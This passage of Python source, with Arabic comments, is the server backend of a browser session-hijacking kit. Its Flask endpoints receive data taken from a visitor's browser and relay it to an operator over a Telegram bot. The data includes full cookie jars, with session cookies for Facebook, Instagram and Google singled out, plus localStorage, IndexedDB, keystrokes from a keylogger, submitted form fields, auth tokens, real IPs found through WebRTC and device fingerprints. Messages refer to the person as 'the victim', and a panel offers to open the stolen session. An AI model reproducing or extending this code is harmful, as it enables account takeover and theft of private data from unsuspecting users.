        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400
        try:
            if redis_client:
                stored = redis_client.get(f"sh_session:{session_id}")
                if not stored:
                    return "Session expired", 410
        except Exception:
            pass
        create_sh_session(session_id, chat_id)
        html = (SH_MAIN_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL))
        return html, 200

    @app.route('/sh_create', methods=['POST'])
    def sh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_sh_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200

    # ============================================================
    # ★★★ المسار الرئيسي لاستقبال البيانات
    # ============================================================
    @app.route('/sh_data', methods=['POST'])
    def sh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            dtype = data.get('type')

            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 200

            # حدّث الجلسة
            sess = get_sh_session(session_id)
            if sess:
                sess['last_seen'] = time.time()
            else:
                create_sh_session(session_id, chat_id)

            # IP
            source_ip = (request.headers.get('CF-Connecting-IP') or
                        request.headers.get('X-Forwarded-For') or
                        request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            _handle_sh_incoming(bot, int(chat_id) if str(chat_id).isdigit() else chat_id,
                               session_id, data, source_ip)

            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] sh_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 500


# ============================================================
# [7] معالجة الوارد
# ============================================================
def _handle_sh_incoming(bot, chat_id, session_id, data, source_ip):
    dtype = data.get('type')
    print(f"[SH <<] {dtype} | {session_id[:8]}")

    try:
        # ---------- التقاط كامل (الطبقة الذهبية) ----------
        if dtype == 'full_steal':
            cookies = data.get('cookies_visible', '')
            ls = data.get('localStorage', {})
            ss = data.get('sessionStorage', {})
            idb = data.get('indexedDB', {})
            cache = data.get('caches', {})

            # 🚨 أهم كوكيز
            important_cookies = []
            for cookie_name in ['c_user', 'xs', 'datr', 'fr', 'sb', 'sessionid',
                                'csrftoken', 'ds_user_id', 'sessionid', 'auth_token',
                                'SSID', 'HSID', 'SID', 'SAPISID', 'APISID', '__Secure-1PSID']:
                if cookie_name in cookies:
                    important_cookies.append(cookie_name)

            msg = (
                "🎯 **التقاط كامل لجلسة الضحية!**\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                f"🔗 **الموقع:** `{data.get('url', 'N/A')[:80]}`\n"
                f"🌐 **IP:** `{source_ip}`\n"
                f"🕐 `{data.get('timestamp', 'N/A')[:19]}`\n\n"
                f"🍪 **الكوكيز المرئية:** `{len(cookies)}` حرف\n"
                f"⭐ **كوكيز مهمة:** {', '.join(important_cookies) if important_cookies else 'لا يوجد'}\n"
                f"💾 **LocalStorage:** `{len(ls)} عنصر`\n"
                f"🔐 **SessionStorage:** `{len(ss)} عنصر`\n"
                f"📦 **IndexedDB:** `{len(idb)} store`\n"
                f"🗄️ **Cache:** `{len(cache)} cache`\n"
            )
            bot.send_message(chat_id, msg, parse_mode="Markdown")

            # أرسل تفاصيل الكوكيز في ملف
            cookies_text = _format_cookies(data)
            if cookies_text:
                buf = io.BytesIO(cookies_text.encode('utf-8'))
                buf.name = f'cookies_{session_id[:8]}.txt'
                bot.send_document(chat_id, buf,
                    caption="🍪 **ملف الكوكيز الكامل**",
                    parse_mode="Markdown")

            # LocalStorage
            if ls:
                ls_text = json.dumps(ls, ensure_ascii=False, indent=2)
                if len(ls_text) > 200:
                    buf = io.BytesIO(ls_text.encode('utf-8'))
                    buf.name = f'localStorage_{session_id[:8]}.json'
                    bot.send_document(chat_id, buf,
                        caption=f"💾 **LocalStorage ({len(ls)} عنصر)**",
                        parse_mode="Markdown")

            # لوحة تحكم
            markup = _build_sh_panel(session_id, chat_id)
            bot.send_message(chat_id,
                "🎛️ **لوحة التحكم بالجلسة:**",
                reply_markup=markup)

        # ---------- retry ----------
        elif dtype == 'retry_click':
            bot.send_message(chat_id,
                f"👆 الضحية ضغط إعادة المحاولة\n"
                f"🆔 `{session_id[:8]}`",
                parse_mode="Markdown")

        # ---------- جهاز ----------
        elif dtype == 'device':
            text = _format_device_report(data, source_ip, session_id)
            bot.send_message(chat_id, text, parse_mode="Markdown",
                           disable_web_page_preview=True)

        # ---------- WebRTC IPs ----------
        elif dtype == 'webrtc_ips':
            ips = data.get('ips', [])
            if ips:
                bot.send_message(chat_id,
                    f"🕵️ **IPs حقيقية من WebRTC:**\n" +
                    "\n".join(f"• `{ip}`" for ip in ips),
                    parse_mode="Markdown")

        # ---------- Keylogger ----------
        elif dtype == 'keystroke':
            text = data.get('text', '')
            if text.strip():
                bot.send_message(chat_id,
                    f"⌨️ **كتابة:**\n```\n{text[:500]}\n```\n"
                    f"🌐 `{data.get('url', '')[:60]}`",
                    parse_mode="Markdown")

        # ---------- Form Submit ----------
        elif dtype == 'form_submit':
            fields = data.get('fields', {})
            lines = ["📝 **نموذج تم إرساله:**"]
            for k, v in list(fields.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            lines.append(f"\n🌐 `{data.get('url', '')[:60]}`")
            bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

        # ---------- Field Input ----------
        elif dtype == 'field_input':
            name = data.get('name', '')
            value = data.get('value', '')
            if value and len(value) > 0:
                bot.send_message(chat_id,
                    f"⌨️ **إدخال:** `{name}` = `{value[:200]}`",
                    parse_mode="Markdown")

        # ---------- Auth Token ----------
        elif dtype == 'auth_token':
            auth = data.get('auth', '')
            bot.send_message(chat_id,
                f"🔑 **Token مكتشف:**\n```\n{auth[:500]}\n```",
                parse_mode="Markdown")

        # ---------- Snapshot دوري ----------
        elif dtype == 'periodic_snapshot':
            cookies = data.get('cookies', '')
            ls = data.get('localStorage', {})
            if cookies or ls:
                # فقط أرسل لو فيه جديد
                pass  # نتجاهل الإزعاج

        # ---------- Cache ----------
        elif dtype == 'cache':
            c = data.get('cache', {})
            if c:
                text = json.dumps(c, ensure_ascii=False, indent=2)
                if len(text) > 500:
                    buf = io.BytesIO(text.encode('utf-8'))
                    buf.name = f'cache_{session_id[:8]}.json'
                    bot.send_document(chat_id, buf,
                        caption=f"🗄️ **Cache Storage ({len(c)} cache)**",
                        parse_mode="Markdown")

        # ---------- HTML ----------
        elif dtype == 'page_html':
            html = data.get('html', '')
            if html and len(html) > 100:
                buf = io.BytesIO(html.encode('utf-8'))
                buf.name = f'page_{session_id[:8]}.html'
                bot.send_document(chat_id, buf,
                    caption=f"📄 **HTML: {data.get('title', '')[:60]}**\n`{data.get('url', '')[:80]}`",
                    parse_mode="Markdown")

        elif dtype == 'sw_ping':
            pass

    except Exception as e:
        print(f"[-] _handle_sh_incoming error ({dtype}): {e}")
        import traceback
        traceback.print_exc()


# ============================================================
# [8] تنسيقات
# ============================================================
def _format_cookies(data):
    lines = ["=" * 60]
    lines.append(f"URL: {data.get('url', 'N/A')}")
    lines.append(f"Origin: {data.get('origin', 'N/A')}")
    lines.append(f"Referrer: {data.get('referrer', 'N/A')}")
    lines.append(f"Time: {data.get('timestamp', 'N/A')}")
    lines.append("=" * 60)
    lines.append("\n--- VISIBLE COOKIES ---")
    lines.append(data.get('cookies_visible', 'N/A'))

    by_path = data.get('cookies_by_path', {})
    if by_path:
        lines.append("\n--- COOKIES BY PATH ---")
        for path, c in by_path.items():
            lines.append(f"\n[{path}]\n{c}")

    lines.append("\n" + "=" * 60)
    lines.append("--- LOCAL STORAGE ---")
    lines.append(json.dumps(data.get('localStorage', {}), ensure_ascii=False, indent=2))

    lines.append("\n" + "=" * 60)
    lines.append("--- SESSION STORAGE ---")
    lines.append(json.dumps(data.get('sessionStorage', {}), ensure_ascii=False, indent=2))

    lines.append("\n" + "=" * 60)
    lines.append("--- INDEXEDDB ---")
    lines.append(json.dumps(data.get('indexedDB', {}), ensure_ascii=False, indent=2)[:50000])

    return "\n".join(lines)


def _format_device_report(data, source_ip, session_id):
    scr = data.get('screen', {})
    hw = data.get('hw', {})
    bat = data.get('battery', {})
    net = data.get('network', {})
    gpu = data.get('gpu', {})
    fonts = data.get('fonts', [])

    return (
        "🖥️ **بصمة الجهاز الكاملة**\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🌐 IP: `{source_ip}`\n"
        f"🔗 URL: `{data.get('url', 'N/A')[:80]}`\n\n"
        f"💻 **النظام:** `{data.get('platform')}`\n"
        f"🌍 **اللغة:** `{data.get('lang')}`\n"
        f"🕐 **التوقيت:** `{data.get('tz')}`\n\n"
        f"📐 **الشاشة:** `{scr.get('w')}x{scr.get('h')}` "
        f"(DPR `{scr.get('dpr')}`, `{scr.get('depth')}-bit`)\n"
        f"⚙️ **المعالج:** `{hw.get('cores')} cores` | "
        f"RAM: `{hw.get('memory')} GB`\n\n"
        f"🎮 **GPU:** `{gpu.get('vendor', 'N/A')}` / `{gpu.get('renderer', 'N/A')[:60]}`\n\n"
        f"🔋 **البطارية:** `{bat.get('level', 'N/A')}%` "
        f"({'⚡ تشحن' if bat.get('charging') else 'غير مشحون'})\n"
        f"📶 **الشبكة:** `{net.get('type', 'N/A')}` | "
        f"↓`{net.get('downlink', 'N/A')}Mbps`\n\n"
        f"🔤 **الخطوط:** {len(fonts)} خط مكتشف\n"
        f"🖼️ **Canvas FP:** `{data.get('canvas_fp', 'N/A')}`"
    )


def _build_sh_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("🍪 تحميل الكوكيز", callback_data=f"sh_cookies_{session_id}"),
        InlineKeyboardButton("💾 Storage", callback_data=f"sh_storage_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🔑 Tokens", callback_data=f"sh_tokens_{session_id}"),
        InlineKeyboardButton("📄 HTML", callback_data=f"sh_html_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🎯 افتح جلسة", callback_data=f"sh_open_{session_id}"),
        InlineKeyboardButton("🗑️ حذف الجلسة", callback_data=f"sh_delete_{session_id}"),
    )
    return m


# ============================================================
# [9] نقاط الوصول للجلسة
# ============================================================
def get_sh_session_data(session_id):
    """يرجع كل بيانات الجلسة"""
    sess = get_sh_session(session_id)
    return sess
